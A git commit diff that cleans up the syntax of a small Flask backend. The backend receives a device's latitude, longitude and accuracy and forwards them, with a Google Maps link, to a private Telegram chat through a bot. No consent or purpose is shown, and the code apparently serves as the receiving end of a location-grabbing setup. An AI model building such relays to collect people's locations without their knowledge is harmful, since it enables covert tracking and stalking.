0073f7cc87bde8c6abe2d2242530ebfe90a6bc04
Mrrobot-space666 <yasraref6@gmail.com>
2026-09-25 15:28:02 +0300

    Fix backend syntax

--- app.py
+++ app.py
@@ -1,29 +1,41 @@
-from flask import Flask, request, jsonify import requests import os
-app = Flask(name)
-BOT_TOKEN = os.environ.get("BOT_TOKEN") CHAT_ID = os.environ.get("CHAT_ID")
-@app.route("/location", methods=["POST"]) def receive_location(): data = request.json
-Python
-latitude = data.get("latitude")
-longitude = data.get("longitude")
-accuracy = data.get("accuracy")
+from flask import Flask, request, jsonify
+import requests
+import os
 
-message = (
-    "📍 New Location\n\n"
-    f"Latitude: {latitude}\n"
-    f"Longitude: {longitude}\n"
-    f"Accuracy: {accuracy} meters\n\n"
-    f"https://www.google.com/maps?q={latitude},{longitude}"
-)
+app = Flask(__name__)
 
-url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
 
-requests.post(
-    url,
-    json={
-        "chat_id": CHAT_ID,
-        "text": message
-    }
-)
 
-return jsonify({"success": True})
-if name == "main": app.run(host="0.0.0.0", port=10000
+@app.route("/location", methods=["POST"])
+def receive_location():
+    data = request.json
+
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+    accuracy = data.get("accuracy")
+
+    message = (
+        "New Location\n\n"
+        f"Latitude: {latitude}\n"
+        f"Longitude: {longitude}\n"
+        f"Accuracy: {accuracy} meters\n\n"
+        f"https://www.google.com/maps?q={latitude},{longitude}"
+    )
+
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+    requests.post(
+        url,
+        json={
+            "chat_id": CHAT_ID,
+            "text": message
+        }
+    )
+
+    return jsonify({"success": True})
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
